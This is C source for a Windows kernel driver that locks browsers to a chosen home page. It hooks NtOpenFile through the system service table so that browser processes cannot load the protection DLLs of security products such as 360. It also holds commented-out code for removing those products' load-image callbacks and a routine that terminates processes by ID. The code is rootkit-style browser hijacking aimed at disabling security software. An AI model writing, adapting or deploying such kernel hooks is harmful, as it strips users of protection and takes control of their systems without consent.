
#include <ntifs.h>
#include <ntstrsafe.h>

#include "LockHomePage.h"
#include "IoControl.h"
#include "ToolFunction.h"
#include "InlineHook.h"


////////////////////////////////////////////////////////////////////////////////////////////
// 技术方案：
//
// 1) HOOK NtOpenFile, 阻止360模块向浏览器进程注入(起线程周期性不断挂钩,防止被摘)
// 2) 修改浏览器进程命令行参数
//
////////////////////////////////////////////////////////////////////////////////////////////

//
// 全局锁定信息
//
WCHAR g_LockedURL[MAX_URL_LENGTH] = L"http://www.pediy.com";

HOOKID g_NtOpenFileHookId = INVALID_HOOKID;



//声明 SSDT
typedef struct _KSERVICE_TABLE_DESCRIPTOR {
	PULONG_PTR Base;
	PULONG Count;
	ULONG Limit;
	PUCHAR Number;
} KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR;

extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;



NTSTATUS LhpSetLockInfo(PWSTR LockedURL)
{
	NTSTATUS Status = STATUS_SUCCESS;

	RtlZeroMemory(g_LockedURL, sizeof(g_LockedURL));
	Status = RtlStringCbCopyNW(g_LockedURL, sizeof(g_LockedURL), LockedURL, MAX_URL_LENGTH);

	return Status;
}


//////////////////////////////////////////////////////////////////////////
// 防注入文件访问检查
//////////////////////////////////////////////////////////////////////////
NTSTATUS LhpBdaiCheckCreateFile(IN PUNICODE_STRING usFileName)
{
	NTSTATUS Status = STATUS_SUCCESS;
	PLIST_ENTRY Entry = NULL;
	WCHAR szCurrentProcess[MAX_PATH] = {0};
	ULONG bufLen = _countof(szCurrentProcess);
	WCHAR szFileName[MAX_PATH] = {0};
	ULONG Index = 0;

	RtlStringCbCopyUnicodeString(szFileName, sizeof(szFileName), usFileName);
	_wcslwr(szFileName);

	LhpGetProcessImageNameByProcessId(PsGetCurrentProcessId(), szCurrentProcess, &bufLen);
	_wcslwr(szCurrentProcess);


	//
	// 进程过滤
	//
	for (Index = 0; Index < _countof(g_AllBrowsersNameList); Index++)
	{
		if (wcsstr(szCurrentProcess, g_AllBrowsersNameList[Index]) != NULL)
			break;
	}

	if (Index == _countof(g_AllBrowsersNameList))
	{
		return STATUS_SUCCESS;
	}


	//
	// 文件过滤
	//
	for (Index = 0; Index < _countof(g_AllAntiInjectDllNameList); Index++)
	{
		if (wcsstr(szFileName, g_AllAntiInjectDllNameList[Index]) != NULL)
			break;
	}

	if (Index == _countof(g_AllAntiInjectDllNameList))
	{
		return STATUS_SUCCESS;
	}

	return STATUS_ACCESS_DENIED;
}



//////////////////////////////////////////////////////////////////////////
// 访问文件挂钩入口2: NtOpenFile
//////////////////////////////////////////////////////////////////////////

typedef
NTSTATUS (NTAPI *PFNNtOpenFile)(
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN ULONG  ShareAccess,
    IN ULONG  OpenOptions
    );

NTSTATUS
NTAPI
LhpHookPrevNtOpenFile(
    OUT PHANDLE  FileHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN POBJECT_ATTRIBUTES  ObjectAttributes,
    OUT PIO_STATUS_BLOCK  IoStatusBlock,
    IN ULONG  ShareAccess,
    IN ULONG  OpenOptions
    )
{
	NTSTATUS Status = STATUS_SUCCESS;


	do 
	{
		if (KeGetCurrentIrql() != PASSIVE_LEVEL){
			break;
		}

		if (ExGetPreviousMode() != UserMode){
			break;
		}

		if (!ObjectAttributes || !ObjectAttributes->ObjectName){
			break;
		}

		//
		// 进入防注入检查
		//
		__try
		{
			Status = LhpBdaiCheckCreateFile(ObjectAttributes->ObjectName);
		}
		__except(EXCEPTION_EXECUTE_HANDLER)
		{
			Status = STATUS_SUCCESS;
		}

	} while (FALSE);


	//
	// 放行则需调用原函数
	//
	if (NT_SUCCESS(Status))
	{
		PVOID OriginFunAddress = LhpHookGetOriginFunAddress(g_NtOpenFileHookId);
		if (OriginFunAddress)
		{
			Status = ((PFNNtOpenFile)OriginFunAddress)(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, ShareAccess, OpenOptions);
		}
		else
		{
			Status = STATUS_UNSUCCESSFUL;
		}
	}

	return Status;
}

//
// 锁定初始化
//
NTSTATUS LhpLockInit()
{
	ESystemVersion SystemVersion = 0;
	ULONG NtOpenFileServiceNumber = 0;
	PVOID NtOpenFileAddress = NULL;

	//DbgBreakPoint();

	LhpGetSystemVersion(&SystemVersion);
	if (SystemVersion == e_Windows_XP)
	{
		NtOpenFileServiceNumber = 0x74;
	}
	else if (SystemVersion == e_Windows_7)
	{
		NtOpenFileServiceNumber = 0xB3;
	}
	else
	{
		return STATUS_NOT_SUPPORTED;
	}

	NtOpenFileAddress = (PVOID)(KeServiceDescriptorTable->Base[NtOpenFileServiceNumber]);
	//
	// 这里可以检测一下 NtOpenFileAddress 是否是ntoskrn.exe的加载空间内
	//


	//
	// 安装HOOK
	//
	LhpHookModuleInit();

	g_NtOpenFileHookId = LhpHookInstallHook(NtOpenFileAddress, LhpHookPrevNtOpenFile);
	if (g_NtOpenFileHookId == INVALID_HOOKID)
	{
		 LhpHookModuleUninit();
		 return STATUS_UNSUCCESSFUL;
	}

	//
	// 摘除360、Q管等的回调
	//
	/*
	if (NT_SUCCESS(LhpRemoveModuleLoadImageCallback(L"xx")))
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() 成功------/\n"));
	}
	else
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() 失败------/\n"));
	}

	if (NT_SUCCESS(LhpRemoveModuleLoadImageCallback(L"xx")))
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() 成功------/\n"));
	}
	else
	{
		KdPrint(("/------LhpRemoveModuleLoadImageCallback() 失败------/\n"));
	}
	*/
	

	//
	// 开启钩子检测线程
	//

	return STATUS_SUCCESS;
}


NTSTATUS LhpLockUninit()
{
	//
	// 通知钩子检测线程退出
	//


	//
	// 恢复HOOK
	//
	LhpHookUninstallHook(g_NtOpenFileHookId);
	LhpHookModuleUninit();

	return STATUS_SUCCESS;
}

//
// 重启进程方式锁定
//
NTSTATUS LhpRestartProcess(ULONG Pid)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE hProcess = NULL;
	CLIENT_ID Cid = {(HANDLE)Pid, 0};
	OBJECT_ATTRIBUTES OA;
	RtlZeroMemory(&OA, sizeof(OA));
	OA.Length = sizeof(OA);

	Status = ZwOpenProcess(&hProcess, 0x01/*PROCESS_TERMINATE*/, &OA, &Cid);
	if (NT_SUCCESS(Status))
	{
		ZwTerminateProcess(hProcess, 0);
		ZwClose(hProcess);
	}

	return Status;
}